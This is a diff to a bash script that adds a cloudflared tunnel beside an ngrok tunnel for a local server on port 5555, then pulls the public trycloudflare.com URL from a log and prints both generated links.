@@ -49,11 +49,14 @@ echo
 echo -e "[${Green}✔${clear}] ${IYellow}GENERATING LINK PLEASE WAIT... ${clear}"
 
 $HOME/ngrok http 5555 > /dev/null 2>&1 &
+$HOME/cloudflared tunnel -url localhost:5555 --logfile $HOME/.cf.log > /dev/null 2>&1 &
 sleep 7
 #below lines can be sued for generating direct link.
 url=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
+cdf=$(cat $HOME/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
 echo -e "
 \t${IGreen}├──${clear}${Green} Your link
+\t${IGreen}├──${clear}${Green} $cdf ${clear}
 \t${IGreen}└──${clear}${Green} $url ${clear}"
 echo
 
